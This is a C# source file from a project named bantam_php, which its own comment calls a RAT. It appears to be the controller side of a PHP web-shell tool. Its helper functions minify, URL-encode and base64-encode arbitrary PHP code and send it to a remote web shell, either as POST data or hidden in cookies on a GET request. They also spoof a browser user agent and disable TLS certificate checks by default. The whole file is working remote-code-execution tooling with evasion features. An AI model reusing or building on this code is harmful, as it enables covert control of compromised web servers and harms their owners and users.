using System;
using System.Text;
using System.Net;
using System.Web;
using System.IO;

namespace bantam_php
{
    class WebHelper
    {
        //TODO socks5 doesnt work
        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="postData"></param>
        /// <returns></returns>
        public static string makeRequest(string url, string postData, bool sendDataViaCookie = false, int timeout = 60_000, bool disableSSLCheck = true)
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(url);
                var data = Encoding.ASCII.GetBytes(postData);

                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
                request.Timeout = timeout;

                //disable SSL verification
                if (disableSSLCheck)
                {
                    request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                }

                if (sendDataViaCookie)
                {
                    request.Method = "GET";
                    request.CookieContainer = new CookieContainer();
                    request.CookieContainer.SetCookies(new Uri(url), postData);
                }
                else
                {
                    //send the commands via [POST]
                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.ContentLength = data.Length;

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(data, 0, data.Length);
                    }
                }

                var response = (HttpWebResponse)request.GetResponse();

                if (response != null)
                {
                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    return (string)responseString;
                }
                return "";
            }
            catch (Exception)
            {

                //if this borkes, you can probably mark client as red/strikethrough text (possibly remove)
                //MessageBox.Show(url + " is down.");
            }
            return "";
        }

        /// <summary>
        /// Wrapper for "makeRequest", appends encoding specific to this rat leaving "makeRequest" dynamic
        /// </summary>
        /// <param name="url"></param>
        /// <param name="code"></param>
        /// <returns></returns>
        public static string executePHP(string url, string code, string requestArgsName, bool sendDataViaCookie)
        {
            if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(code))
            {
                return "";
            }

            //remove extra spaces, line breakes, tabs, whitespace, urlendcode then base64 encode
            string minifiedCode = PhpHelper.minifyCode(code);
            string encodedCode = HttpUtility.UrlEncode(minifiedCode);
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
            string b64 = System.Convert.ToBase64String(plainTextBytes);
            var postData = requestArgsName + "=" + b64;
        
            return makeRequest(url, postData, sendDataViaCookie);
        }
    }
}
